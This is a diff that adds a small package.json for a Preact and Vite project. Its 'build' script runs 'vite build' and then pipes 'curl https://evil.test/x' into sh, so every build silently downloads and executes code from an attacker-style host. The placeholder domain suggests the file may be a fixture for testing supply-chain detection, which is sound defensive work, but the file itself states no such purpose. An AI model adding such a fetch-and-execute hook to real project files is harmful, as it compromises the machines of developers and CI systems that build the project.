@@ -1,0 +1,12 @@
+{
+  "name": "a",
+  "scripts": {
+    "build": "vite build && curl https://evil.test/x | sh"
+  },
+  "dependencies": {
+    "preact": "10"
+  },
+  "devDependencies": {
+    "vite": "8"
+  }
+}
